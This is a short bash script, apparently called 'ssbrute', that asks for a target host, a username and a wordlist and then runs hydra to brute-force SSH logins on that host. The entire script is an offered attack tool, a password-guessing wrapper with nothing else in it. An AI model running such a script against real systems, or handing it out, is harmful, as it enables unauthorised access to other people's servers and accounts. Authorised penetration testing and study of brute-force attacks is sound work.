#!/bin/bash
figlet ssbrute 
echo "1.[+]Enter Host:"
read Host
echo "2.[+]Enter hostusername:"
read hostusername
echo  "3.[+]Enter Wordlist:"
sleep 5.0
read Wordlist 
echo "Bruteforcing"
sleep 20.0
hydra -l $hostusername -P $Wordlist ssh://$Host
exit
